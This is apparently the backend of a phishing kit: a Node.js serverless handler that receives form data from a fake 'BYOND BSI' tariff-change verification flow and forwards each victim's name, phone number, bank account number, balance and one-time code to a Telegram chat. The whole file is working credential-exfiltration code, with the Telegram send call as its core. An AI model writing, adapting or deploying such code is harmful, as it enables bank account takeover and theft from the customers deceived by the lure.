const axios = require('axios');

exports.handler = async (event, context) => {
    // Handle CORS preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST'
            }
        };
    }

    // Only accept POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            throw new Error('Telegram credentials not configured');
        }

        // Format message based on step
        let message;
        switch (data.step) {
            case 'tariff-selection':
                message = `📢 *BYOND BSI - PILIHAN TARIF*\n\n` +
                          `Pelanggan memilih: ${data.tariff === 'old' ? 'Tarif Lama' : 'Tarif Baru'}`;
                break;

            case 'account-verification-1':
                message = `🔐 *BYOND BSI - VERIFIKASI 1*\n\n` +
                          `Nama: ${data.name}\n` +
                          `No HP: ${data.phone}\n` +
                          `Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}`;
                break;

            case 'account-verification-2':
                message = `🔢 *BYOND BSI - VERIFIKASI 2*\n\n` +
                          `No Rekening: ${data.accountNumber}`;
                break;

            case 'account-verification-3':
                message = `💰 *BYOND BSI - VERIFIKASI 3*\n\n` +
                          `Saldo: Rp ${formatNumber(data.balance)}`;
                break;

            case 'complete-verification':
                message = `✅ *BYOND BSI - VERIFIKASI BERHASIL!*\n\n` +
                          `Nama: ${data.name}\n` +
                          `No HP: ${data.phone}\n` +
                          `No Rek: ${data.accountNumber}\n` +
                          `Saldo: Rp ${formatNumber(data.balance)}\n` +
                          `Kode: ${data.virtualCode}\n` +
                          `Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}`;
                break;

            case 'request-new-code':
                message = `🔄 *BYOND BSI - PERMINTAAN KODE BARU*\n\n` +
                          `No HP: ${data.phone}`;
                break;

            default:
                message = `ℹ️ *BYOND BSI - DATA DITERIMA*\n\n` +
                          JSON.stringify(data, null, 2);
        }

        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
            headers: { 'Content-Type': 'application/json' }
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                success: false,
                error: error.message 
            })
        };
    }
};

// Helper function to format numbers
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        }
